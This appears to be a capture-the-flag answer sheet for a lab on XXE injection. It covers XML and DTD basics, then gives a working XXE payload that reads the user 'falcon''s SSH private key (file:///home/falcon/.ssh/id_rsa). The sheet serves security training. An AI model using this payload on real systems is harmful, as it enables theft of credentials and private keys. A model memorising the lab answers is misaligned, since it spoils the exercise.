# XXE

- Deploy the VM

	  no answer needed

- Full form of XML

	- `Extensible markup Language`

- Is XML case sensitive?

	- `yes`

- Is it compulsory to have XML prolog in XML documents?

	- `no`

- Can we validate XML documents against so schema?

	- `yes`

- How can we specify XML version and encoding in XML document?

	- `XML Prolog`

- With what extension do you save a DTD file?

	- `dtd`

- How do you define a new ELEMENT?

	- `!ELEMENT`

- How do you define a ROOT element?

	- `!DOCTYPE`

- How do you define a new ENTITY?

	- `!ENTITY`

- Try the payload mentioned in description on the website.

	  no answer needed

- Try to display your own name using any payload.

	  no answer needed

- See if you can read the /etc/passwd

	  no answer needed

- What is the name of the user in /etc/passwd

	- `falcon`

- Where is falcon's SSH key located?

	  no answer needed

- What are the first 18 characters for falcon's private key

	~~~
	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
	<root>&read;</root>
	~~~
	- `********************`


